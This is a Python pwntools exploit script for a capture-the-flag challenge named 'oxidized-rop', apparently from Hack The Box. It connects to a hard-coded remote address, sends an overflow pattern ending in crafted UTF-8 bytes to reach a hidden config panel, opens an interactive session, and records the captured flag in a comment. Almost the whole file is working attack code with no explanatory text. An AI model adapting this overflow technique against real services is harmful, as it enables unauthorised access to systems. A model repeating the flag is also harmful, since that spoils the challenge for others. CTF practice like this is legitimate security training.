from pwn import *

context.log_level = 'debug'

def enc(string): # Construct a UTF-8 string that has our input as char points
	b = ""
	for c in string:
		b += (b"\\u04%2x" % c).replace(b" ", b"0").decode("unicode_escape")
		# Sorry!
	print(string, b)
	return b

ip, port = '134.122.104.91', 32475

payload = b'\xf0\x9e\x89\x80'
#payload = b'@\xc3\xa2\x01'
#print(payload)

s = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaAB' + payload
io = remote(ip, port)
#io = process('./oxidized-rop')
#io = gdb.debug('./oxidized-rop', 'break present_config_panel')
io.recvuntil(b'Selection:')
io.sendline(b'1')
io.recvuntil(b'Statement (max 200 characters):')
io.sendline(s)
io.recvuntil(b'Selection:')
io.sendline(b'2')
io.interactive()
#HTB{7h3_0r4n63_cr4b_15_74k1n6_0v3r!}
